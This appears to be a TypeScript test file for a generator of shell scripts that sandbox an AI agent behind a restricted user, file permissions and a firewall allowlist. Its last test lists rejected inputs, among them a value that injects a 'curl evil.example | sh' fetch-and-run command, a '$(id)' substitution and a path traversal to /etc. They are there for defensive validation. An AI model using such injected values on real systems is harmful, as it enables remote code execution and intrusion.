/** The generated setup script for running an untrusted-input agent in a Boat sandbox. */
import { describe, expect, test } from "bun:test";
import { WorkspaceError } from "../src";
import { agentSandboxSetupScript } from "../src/boat";

const HOSTS = ["gateway.example.com", "api.example.org"];

describe("agentSandboxSetupScript", () => {
  const script = agentSandboxSetupScript({ allowHosts: HOSTS, loopbackPorts: [4100] });

  test("is valid shell that stops at the first failure", async () => {
    expect(script).toStartWith("set -eu\n");
    const check = Bun.spawnSync(["bash", "-n"], { stdin: Buffer.from(script) });
    expect(check.stderr.toString()).toBe("");
    expect(check.exitCode).toBe(0);
  });

  test("creates a fresh user with no shell and fails if it can sudo", () => {
    expect(script).toContain("AGENT='sandchest-agent'");
    expect(script).toContain(`! id -u "$AGENT" >/dev/null 2>&1 || fail "user $AGENT already exists"`);
    expect(script).toContain(`sudo -n useradd --system --no-create-home --home-dir "$WORKDIR" --shell /usr/sbin/nologin "$AGENT"`);
    expect(script).not.toContain("usermod");
    expect(script).toContain(`if sudo -n -u "$AGENT" -- sudo -n true >/dev/null 2>&1; then fail "the agent user can use sudo"; fi`);
  });

  test("gives read access to the checkout and write access to the work directory only", () => {
    expect(script).toContain("CHECKOUT='/home/user/repo'");
    expect(script).toContain("WORKDIR='/home/user/agent'");
    expect(script).toContain(`sudo -n find "$HOME" -mindepth 1 -maxdepth 1 ! -type l ! -path "$CHECKOUT" ! -path "$WORKDIR" -exec chmod o-rwx {} +`);
    expect(script).toContain(`chmod 755 "$CHECKOUT"`);
    expect(script).toContain(`sudo -n chown "$AGENT:$SANDBOX_GROUP" "$WORKDIR"`);
    expect(script).toContain(`sudo -n chmod 2770 "$WORKDIR"`);
    // Each directory above them, once.
    expect(script).toContain("traverse '/home'\ntraverse '/home/user'\n");
    expect(script.match(/^traverse '/gm)).toHaveLength(2);
  });

  test("drops everything the user sends except 443 to the allowed hosts, DNS and the loopback ports", () => {
    expect(script).toContain("ALLOW_HOSTS='gateway.example.com api.example.org'");
    expect(script).toContain("LOOPBACK_PORTS='4100'");
    expect(script).toContain(`getent ahostsv4 "$host"`);
    expect(script).toContain(`grep -v '^::ffff:'`);
    expect(script).toContain(`[ -n "$a$b" ] || fail "cannot resolve $host"`);
    expect(script).toContain(`-I OUTPUT 1 -m owner --uid-owner "$AGENT_UID" -j "$CHAIN"`);
    expect(script).toContain(`-p tcp -d "$ip" --dport 443 -j ACCEPT`);
    expect(script).toContain(`-p udp -d "$ns" --dport 53 -j ACCEPT`);
    expect(script).toContain(`-o lo -p tcp --dport "$port" -j ACCEPT`);
    // The drop comes after every accept in the chain.
    const firewall = script.slice(script.indexOf("firewall() {"), script.indexOf("\n}\n", script.indexOf("firewall() {")));
    expect(firewall.trimEnd().endsWith(`sudo -n "$t" -w -A "$CHAIN" -j DROP`)).toBe(true);
    expect(firewall).not.toContain("--dport 80");
  });

  test("filters IPv6 too, failing closed when it cannot", () => {
    expect(script).toContain(`firewall iptables "$V4" "$NS4"`);
    expect(script).toContain(`firewall ip6tables "$V6" "$NS6"`);
    expect(script).toContain(`elif [ -e /proc/net/if_inet6 ]; then\n  fail "IPv6 is enabled but ip6tables is not installed"`);
    expect(script).toContain(`command -v iptables >/dev/null 2>&1 || fail "iptables is not installed"`);
  });

  test("allows DNS to the resolvers by default, and none with dns: false", () => {
    expect(script).toContain("DNS='yes'");
    expect(agentSandboxSetupScript({ allowHosts: HOSTS, dns: true })).toContain("DNS='yes'");
    const noDns = agentSandboxSetupScript({ allowHosts: [], loopbackPorts: [4100], dns: false });
    expect(noDns).toContain("DNS='no'");
    // The resolvers are only collected when DNS is on, so no port 53 rule gets installed.
    expect(noDns).toContain(`if [ "$DNS" = yes ]; then\n  for ns in $(awk`);
    const check = Bun.spawnSync(["bash", "-n"], { stdin: Buffer.from(noDns) });
    expect(check.exitCode).toBe(0);
  });

  test("an agent that reaches only loopback ports needs no hosts", () => {
    const local = agentSandboxSetupScript({ allowHosts: [], loopbackPorts: [4100, 4101] });
    expect(local).toContain("ALLOW_HOSTS=''");
    expect(local).toContain("LOOPBACK_PORTS='4100 4101'");
    expect(() => agentSandboxSetupScript({ allowHosts: [], loopbackPorts: [] })).toThrow(/both empty/);
    expect(() => agentSandboxSetupScript({ allowHosts: [], dns: false })).toThrow(WorkspaceError);
  });

  test("takes custom names and paths", () => {
    const custom = agentSandboxSetupScript({ user: "hunter", checkoutDir: "/tmp/scan/repo", workDir: "/home/user/out", allowHosts: ["10.0.0.1"] });
    expect(custom).toContain("AGENT='hunter'");
    expect(custom).toContain("traverse '/tmp'\ntraverse '/tmp/scan'\ntraverse '/home'\ntraverse '/home/user'\n");
    expect(custom).toContain("LOOPBACK_PORTS=''");
  });

  test("refuses anything that could break out of the quoting, or weaken the boundary", () => {
    const bad = [
      { allowHosts: ["example.com'; curl evil.example | sh; '"] },
      { allowHosts: ["exa mple.com"] },
      { allowHosts: [] },
      { allowHosts: [], loopbackPorts: [] },
      { allowHosts: HOSTS, user: "root" },
      { allowHosts: HOSTS, user: "user" },
      { allowHosts: HOSTS, user: "Agent$(id)" },
      { allowHosts: HOSTS, checkoutDir: "/home/user/repo'" },
      { allowHosts: HOSTS, checkoutDir: "relative/repo" },
      { allowHosts: HOSTS, checkoutDir: "/home/user/../../etc" },
      { allowHosts: HOSTS, workDir: "/home" },
      { allowHosts: HOSTS, workDir: "/home/user/repo/out" },
      { allowHosts: HOSTS, checkoutDir: "/home/user/agent/repo" },
      { allowHosts: HOSTS, loopbackPorts: [0] },
      { allowHosts: HOSTS, loopbackPorts: [70_000] },
    ];
    for (const setup of bad) expect(() => agentSandboxSetupScript(setup)).toThrow(WorkspaceError);
  });
});
